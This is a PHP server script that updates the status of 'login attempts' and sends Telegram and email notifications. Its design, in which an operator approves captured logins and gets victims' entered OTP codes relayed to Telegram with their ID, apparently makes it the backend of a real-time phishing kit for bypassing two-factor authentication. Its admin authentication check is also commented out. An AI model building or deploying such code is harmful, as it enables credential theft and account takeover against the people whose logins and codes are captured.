<?php
include 'db_connect.php';
include_once 'notification_config.php';

header('Content-Type: application/json');

// Ensure no output before JSON response
ob_start();

// Enable error reporting for debugging
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

ini_set('log_errors', 1);
error_log('c:/xampp/php/logs/php_error.log');

// Log the start of the script
error_log("send_notification.php: Script execution started");

// Log database connection status
if ($conn->connect_error) {
    error_log("Database connection failed: " . $conn->connect_error);
    echo json_encode(['success' => false, 'message' => 'Database connection failed.']);
    exit;
} else {
    error_log("Database connection successful");
}

// Check authentication
/*session_start();
if (!isset($_SESSION['admin_logged_in'])) {
    echo json_encode(['success' => false, 'message' => 'Unauthorized']);
    exit;
}*/

// Get POST data
$id = $_POST['id'] ?? 0;
$type = $_POST['type'] ?? '';
$newStatus = $_POST['status'] ?? '';

// Log POST data
error_log("POST data: " . json_encode($_POST));

// Log the incoming POST data for debugging
error_log("Incoming POST data: " . json_encode($_POST));

// Standardize status strings
if ($newStatus === 'accepted') {
    $status = 'approved';
} elseif ($newStatus === 'rejected') {
    $status = 'rejected';
} else {
    $status = 'pending'; // Default to 'pending' for any other status
}

// Validate POST data before proceeding
if (empty($id) || empty($status)) {
    error_log("Invalid POST data: id or status is missing");
    echo json_encode(['success' => false, 'message' => 'Invalid data supplied.']);
    exit;
}

// Ensure login attempts are not deleted or removed from the database
$sql = "UPDATE login_attempts SET status = ? WHERE id = ?";
$stmt = $conn->prepare($sql);

// Log the SQL query execution
error_log("Preparing SQL query: UPDATE login_attempts SET status = '{$status}' WHERE id = {$id}");

if (!$stmt) {
    error_log("SQL preparation error: " . $conn->error);
    echo json_encode(['success' => false, 'message' => 'SQL preparation failed.']);
    exit;
}

// Log the SQL query and parameters
error_log("SQL Query: UPDATE login_attempts SET status = '{$status}' WHERE id = {$id}");
error_log("Parameters: status = {$status}, id = {$id}");

// Bind parameters to the prepared statement
$stmt->bind_param("si", $status, $id);

// Initialize the $success variable
$success = false;

if ($stmt->execute()) {
    error_log("Status updated successfully for ID: {$id}");
    $success = true;
    echo json_encode(['success' => true, 'message' => 'Status updated successfully.']);
} else {
    error_log("Error executing query: " . $stmt->error);
    echo json_encode(['success' => false, 'message' => 'Failed to update status.']);
}

$stmt->close();

if ($success) {
    // Send notifications
    sendEmail("Login Status Updated", "The login status has been updated to: {$status}");
    sendToTelegram("🔔 LOGIN STATUS UPDATED 🔔\nType: {$type}\nNew Status: {$status}\nTime: " . date('Y-m-d H:i:s'));

    // If the type is 'otp', update the notification with the OTP
    if ($type === 'otp') {
        $otp = $_POST['otp'] ?? '';
        if (!empty($otp)) {
            sendToTelegram("🔔 OTP ENTERED 🔔\nUser ID: {$id}\nOTP: {$otp}");
        }
    }

    echo json_encode(['success' => true]);
} else {
    error_log("Failed to update login status: " . $conn->error);
    echo json_encode(['success' => false, 'message' => 'Failed to update login status.']);
}

// End of script
ob_end_flush(); // Flush the output buffer and send the response
?>